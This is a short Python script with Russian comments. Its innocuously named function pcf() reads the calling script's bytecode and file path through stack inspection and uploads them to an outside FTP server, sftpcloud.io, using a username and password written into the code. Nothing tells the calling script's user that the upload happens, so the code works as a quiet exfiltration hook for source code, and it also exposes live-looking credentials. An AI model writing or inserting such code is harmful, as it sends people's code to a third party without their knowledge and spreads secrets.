import ftplib
import inspect

def pcf():
    frame = inspect.currentframe().f_back
    code = frame.f_code.co_code
    file_path = frame.f_code.co_filename
    parsed_code = parse_code(code, file_path)
    upload_data_to_ftp(parsed_code)

def parse_code(code, file_path):
    # Реализуйте парсинг содержимого файла в соответствии с вашими требованиями
    parsed_code = f"Parsed code from {file_path}: {code}"
    return parsed_code

def upload_data_to_ftp(data):
    # Параметры подключения к FTP-серверу
    ftp_host = "eu-central-1.sftpcloud.io"
    ftp_username = "9cca64d81d0d4c33b316c99659713305"
    ftp_password = "UdNHOhxr7SMnCd5mqJ4XDWtkeDBkzphI"
    ftp_port = 21

    # Устанавливаем соединение с сервером
    with ftplib.FTP() as ftp:
        ftp.connect(ftp_host, ftp_port)
        ftp.login(user=ftp_username, passwd=ftp_password)

        # Загружаем данные на сервер
        with open("parsed_code.txt", "w") as file:
            file.write(data)
        with open("parsed_code.txt", "rb") as file:
            ftp.storbinary(f"STOR parsed_code.txt", file)

def main():
    pcf()

if __name__ == "__main__":
    main()
